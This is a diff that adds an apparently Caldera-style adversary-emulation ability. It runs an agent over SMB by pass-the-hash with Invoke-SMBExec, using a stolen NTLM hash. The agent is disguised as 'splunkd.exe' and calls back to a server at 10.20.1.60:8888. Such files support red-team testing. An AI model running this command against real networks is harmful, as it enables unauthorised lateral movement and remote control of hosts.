@@ -1,0 +1,25 @@
+- description: Execute Sandcat over SMB using Pass the Hash
+  id: 85be571c-71d3-44ba-b943-2e17017088ca
+  name: Execute Sandcat over SMB using Pass the Hash
+  platforms:
+    windows:
+      psh:
+        command: |
+          Import-Module .\Invoke-SMBExec.ps1;Invoke-SMBExec -Target #{domain.computer.dnshostname} 
+          -Domain #{domain.ad.name} -Username #{domain.user.name} -Hash #{domain.user.ntlm} 
+          -Command 'C:\Users\Public\splunkd.exe -server http://10.20.1.60:8888 -group jdoe';
+        payloads:
+        - Invoke-SMBExec.ps1
+  requirements:
+  - plugins.stockpile.app.requirements.basic:
+    - edge: has_hash
+      source: domain.user.name
+      target: domain.user.ntlm
+  - plugins.stockpile.app.requirements.no_backwards_movement:
+    - source: domain.computer.dnshostname
+  - plugins.stockpile.app.requirements.one_concurrent:
+    - trait: domain.computer.dnshostname
+  tactic: lateral-movement
+  technique:
+    attack_id: T1550.002
+    name: Use Alternate Authentication Material
